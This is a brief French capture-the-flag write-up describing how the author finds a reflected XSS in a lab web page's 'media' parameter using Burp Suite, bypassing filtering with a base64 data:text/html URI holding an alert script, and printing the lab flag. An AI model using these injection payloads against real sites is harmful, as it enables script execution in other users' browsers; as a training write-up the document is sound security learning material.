
ALEXANDRE DENIS

CTF




1ère attaque XSS : Attaque par injection XSS « Reflected media »

Pour réaliser cette attaque, j’utilise Burpsuite afin de pouvoir intercepter et renvoyer des requêtes au serveur web.

En interceptant la page : http://192.168.77.128/index.php?page=media&src=nsa
Je remarque que la page pourrait être vulnérable à des injections. 

Avec burp :

https://github.com/BossMagne/CTF_AD/blob/main/XSS_REFLEXION_MEDIA/IMAGES/Image1.png






Je vais tenter une faille classique avec un : <script>alert("XXS")</script>

Dans burp je remplace le lien par défaut par :

	GET /?page=media&src=<script>alert("XXS")</script>
J’envoie la requête :
Cependant, aucun résultat.

Je réessaye avec cette fois-ci, de voir si le serveur est sensible aux scripts en base64, avec data:

	 GET /?page=media&src=data:text/html.SALUT HTTP/1.1

 

Je peux voir que le serveur m’affiche le mot « SALUT » que j’ai injecté dans la commande.








Je réessaye avec la commande du début mais en base64 :

	GET /?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== HTTP/1.1











Code de la page :











	
FLAG trouvé : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

